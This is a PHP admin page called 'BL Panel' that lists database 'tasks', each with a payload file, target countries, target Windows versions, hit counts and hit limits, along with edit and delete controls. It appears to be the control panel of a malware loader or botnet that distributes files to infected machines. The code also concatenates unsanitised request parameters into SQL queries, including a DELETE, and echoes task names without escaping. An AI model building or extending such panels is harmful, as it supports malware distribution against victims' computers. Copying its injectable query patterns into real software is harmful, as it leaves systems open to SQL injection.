<?php
include("config.php");
include('checklogin.php');

$sql_task = mysqli_query($conn, "SELECT id,name,priority,file,countries,windows,hits,max FROM tasks ORDER BY id");

function task_error($task_id){
	include("config.php");
	$error_sql = mysqli_query($conn, "SELECT name,priority,file,hits,max FROM tasks WHERE id='".$task_id."'");
	$erro = mysqli_fetch_assoc($error_sql);
	$error_sql_file = mysqli_query($conn, "SELECT id,name,sha256,hits FROM files WHERE id='".$erro['file']."'");
	if(mysqli_num_rows($error_sql_file) < 1){
		return "ERROR - File Missing";
	}
	elseif(mysqli_num_rows($error_sql_file) > 0){
	$erro_file = mysqli_fetch_assoc($error_sql_file);
	    if(!file_exists($upload.$erro_file['name'])){
			return "ERROR - File Missing";
		}
	}
	elseif($erro['hits'] >= $erro['max']){
		return "ERROR - Max Hits Reached";
	}
	return true;
}

function priority_error($task_id, $task_array){
	include("config.php");
	$task_id_sql = mysqli_query($conn, "SELECT id,name,priority,file,hits,max FROM tasks WHERE id='".$task_id."'");
	$task_id_assoc = mysqli_fetch_assoc($task_id_sql);
	foreach($task_array as $key => $priority){
		$key = strval($key);
		if($task_id_assoc['id'] === $key){
			continue;
		}
		if($task_id_assoc['priority'] === $priority){
			$task_array_sql = mysqli_query($conn, "SELECT name,priority,file,hits,max FROM tasks WHERE id='".$key."'");
			$task_array_assoc = mysqli_fetch_assoc($task_array_sql);
			return "ERROR - Same Priority as ".$task_array_assoc['name'];
		}
	}
	return true;
}

if(isset($_GET['delete'])){
	$delete_id = $_GET['delete'];
	$check = mysqli_query($conn, "SELECT name FROM tasks WHERE id='".$delete_id."'");
	$re = mysqli_fetch_assoc($check);
	$sql = mysqli_query($conn, "DELETE FROM tasks WHERE id='$delete_id';");
	echo '<script>window.location.replace("?");</script>';
	die();
}

?>

<html>
<head>
<title> BL Panel </title>
<style>
@import url('https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700');

$base-spacing-unit: 24px;
$half-spacing-unit: $base-spacing-unit / 2;

$color-alpha: #1772FF;
$color-form-highlight: #EEEEEE;

*, *:before, *:after {
	box-sizing:border-box;
}

body {
	padding:$base-spacing-unit;
	font-family:'Source Sans Pro', sans-serif;
	margin:0;
}

h1,h2,h3,h4,h5,h6 {
	margin:0;
}

#image-surround { 
   display: inline-block;
   width: 8%;
}

#image-icon{
	display: inline-block;
	width: 2%;
}

h1 { 
   display: inline-block;
}

#utf a:link {
  color: #000000;
}

#utf a:visited {
  color: #000000;
}

#utf a:hover {
  color: #e60000;
}

#utf a:active {
  color: #000000;
}

.side {
	position: absolute;
	max-width: 5%;
	top: 5%;
	left: 2%;
}

.side button {
  background-color: #000000; 
  border: none;
  color: white;
  width: 50px;
  height: 50px;
  padding: 10px 10px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
}

.container {
	max-width: 1000px;
	margin-right:auto;
	margin-left:auto;
	display:flex;
	justify-content:center;
	align-items:center;
	min-height:50%;
}

.table {
	width:100%;
	border:1px solid $color-form-highlight;
}

.table-header {
	display:flex;
	width:100%;
	background:#000;
	padding:($half-spacing-unit * 1.5) 0;
}

.table-row {
	display:flex;
	width:100%;
	padding:($half-spacing-unit * 1.5) 0;

	&:nth-of-type(odd) {
		background:$color-form-highlight;
	}
}

.table-data, .header__item {
	flex: 1 1 20%;
	text-align:center;
}

.header__item {
	text-transform:uppercase;
}

.button {
  background-color: #000000;
  border: none;
  color: white;
  padding: 15px 32px;
  width: 20%;
  margin-right:auto;
  margin-left:auto;
  text-align: center;
  text-decoration: none;
  display: block;
  font-size: 16px;
}


.filter__link {
	color:white;
	text-decoration: none;
	position:relative;
	display:inline-block;
	padding-left:$base-spacing-unit;
	padding-right:$base-spacing-unit;

	&::after {
		content:'';
		position:absolute;
		right:-($half-spacing-unit * 1.5);
		color:white;
		font-size:$half-spacing-unit;
		top: 50%;
		transform: translateY(-50%);
	}

	&.desc::after {
		content: '(desc)';
	}

	&.asc::after {
		content: '(asc)';
	}

}
</style>
<script>
function confirmation(id){
var result = confirm("Want to delete?");
if (result) {
    window.location.href = "?delete="+id;
}
}
function openInNewTab(url) {
  var win = window.open(url, '_blank');
  win.focus();
}
</script>
</head>
<body>
<center>
<img id="image-surround" src="inc/image.png" alt="" />
<h1> BL Panel </h1>
<img id="image-surround" src="inc/image.png" alt="" />
<br><a href="files.php">(Switch to files)</a>
</center>

<div class="side">
<button title="Stats" onclick="openInNewTab('s.php');"> &#9873; </button><br><br>
<button title="Log Out" onclick="location.href='logout.php';"> &#10094; </button><br>
</div>

<div class="container">
	<div class="table">
		<div class="table-header">
			<div class="header__item"><a id="task" class="filter__link">Task</a></div>
			<div class="header__item"><a id="error" class="filter__link">Errors</a></div>
			<div class="header__item"><a id="hits" class="filter__link filter__link--number">Hits</a></div>
			<div class="header__item"><a id="priority" class="filter__link filter__link--number">Priority</a></div>
			<div class="header__item"><a id="edit" class="filter__link filter__link--number">Edit</a></div>
			<div class="header__item"><a id="delete" class="filter__link filter__link--number">Delete</a></div>
		</div>
		<div class="table-content">
		<?php
		$priorities = array();
		while($re = mysqli_fetch_assoc($sql_task)){
			$task_id = $re['id'];
			$task_name = $re['name'];
			$task_erro = '';
			$task_file = $re['file'];
			$task_priority = $re['priority'];
            $priorities[$task_id] = $task_priority;
			$task_countries = $re['countries'];
			$task_windows = $re['windows'];
			$task_hits = $re['hits'];
			$task_max = $re['max'];
			$task_name_echo = '<div class="table-data">'.$task_name.'</div>';
            if(task_error($task_id) !== true or priority_error($task_id, $priorities) !== true){
				$task_name_echo = '<div class="table-data"><font style="color: #e60000;">'.$task_name.'</font></div>';
				$task_erro = task_error($task_id).';'.priority_error($task_id, $priorities).';';
			}
			echo '<div class="table-row">';
			echo $task_name_echo;
			echo '<div class="table-data">'.$task_erro.'</div>';
			echo '<div class="table-data">'.$task_hits.'</div>';
			echo '<div class="table-data">'.$task_priority.'</div>';
			echo '<div id="utf" class="table-data"><a href="task.php?edit='.$task_id.'">&#9998;</a></div>';
			echo '<div id="utf" class="table-data"><a onclick="confirmation('.$task_id.');" href="#">&#10006;</a></div>';
			echo '</div>';
		}
		?>
		</div>
	</div>
</div>
<br><a href="task.php" class="button">Add Task</a>
</body>
</html>
